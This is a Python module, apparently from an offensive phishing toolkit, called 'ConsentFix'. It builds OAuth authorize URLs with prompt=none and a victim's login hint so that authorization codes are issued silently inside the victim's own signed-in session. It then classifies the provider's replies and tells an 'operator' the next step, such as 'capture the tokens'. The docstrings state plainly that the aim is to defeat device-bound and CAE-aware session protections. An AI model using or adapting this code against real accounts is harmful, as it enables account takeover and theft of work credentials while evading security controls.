# ============================================================================
"""ConsentFix: get the code without a login page at all.

An authorization code is normally issued after a login. But when the browser ALREADY holds a
session at the provider - which is the case for anyone signed into their work account - the
provider can issue the code silently (`prompt=none`) or after a single "Continue" click. That
is the whole technique: no credentials are typed, no lookalike page exists, and the approval
happens inside the real provider's own UI.

What it defeats that plain AiTM does not: a session that is device-bound or CAE-aware cannot
be replayed elsewhere, but a CODE issued inside the victim's own live session produces a
token minted for THEIR device - so the control never fires.

The module implements the mechanics and classifies what the provider answers, because the
answer decides the plan: `login_required` means the victim has no session, `consent_required`
means an admin must approve the app first, `interaction_required` means one click is needed,
and only `code` means it worked silently.
"""
import time

__all__ = ["ERRORS", "classify", "silent_url", "interactive_url", "plan", "describe",
           "ConsentFixError"]


class ConsentFixError(RuntimeError):
    """A refusal the CLI can report verbatim."""


# The provider's answers, and what each one means for the operator.
ERRORS = {
    "login_required": ("no session at the provider: the victim is not signed in, so this "
                       "needs a normal interactive consent (use the OAuth relay)"),
    "interaction_required": ("a session exists but one click is needed - the provider wants "
                            "an explicit approval, which is where ConsentFix earns its name"),
    "consent_required": ("the app has not been consented to: an admin (or the user, if the "
                         "tenant allows it) must approve it once before any silent capture"),
    "access_denied": ("the user or an admin refused the approval"),
    "invalid_grant": ("the code or the refresh token is no longer valid"),
    "unauthorized_client": ("the app is not permitted for this tenant or this flow"),
}


def classify(query):
    """(verdict, detail) from a redirect query.

    `verdict` is one of: code (a silent capture worked), one of the ERRORS keys, or unknown.
    """
    from core.oauth import parse_redirect
    code, _state, error, description = parse_redirect(query)
    if code and not error:
        return "code", "the provider issued a code without asking the user to sign in"
    if error in ERRORS:
        return error, ERRORS[error] + (f" ({description})" if description else "")
    if error:
        return error, description or "the provider refused"
    return "unknown", "the redirect carried neither a code nor an error"


def silent_url(spec, state, challenge, redirect_uri=""):
    """The authorize URL with `prompt=none`: the provider answers without any UI."""
    url = spec.authorize_url(state, challenge, redirect_uri)
    joiner = "&" if "?" in url else "?"
    return f"{url}{joiner}prompt=none"


def interactive_url(spec, state, challenge, redirect_uri="", login_hint=""):
    """The normal authorize URL, with an optional login hint so the account is pre-selected."""
    url = spec.authorize_url(state, challenge, redirect_uri)
    if login_hint:
        from urllib.parse import quote
        joiner = "&" if "?" in url else "?"
        # an address must be percent-encoded in a query string
        url = f"{url}{joiner}login_hint={quote(str(login_hint), safe='')}"
    return url


def plan(spec, state, challenge, redirect_uri="", login_hint=""):
    """Both URLs plus the order to try them, and what each outcome means.

    Silent first is not an optimisation: a silent success is a code minted inside the
    victim's own live session, which is the case no device-bound control can catch.
    """
    return {
        "spec": spec.to_dict() if hasattr(spec, "to_dict") else {},
        "silent": silent_url(spec, state, challenge, redirect_uri),
        "interactive": interactive_url(spec, state, challenge, redirect_uri, login_hint),
        "order": ["silent", "interactive"],
        "meanings": dict(ERRORS),
        "created": time.time(),
    }


def describe(result):
    """A one-line verdict plus the next step for the operator."""
    verdict, detail = result if isinstance(result, tuple) else (result.get("verdict"),
                                                              result.get("detail"))
    step = {
        "code": "capture the tokens (the code is already issued)",
        "login_required": "use the interactive consent URL",
        "interaction_required": "use the interactive consent URL and expect one click",
        "consent_required": "an approval is needed once before silent capture works",
    }.get(verdict, "report it and stop")
    return f"consentfix: {verdict} - {detail}\n  next: {step}"


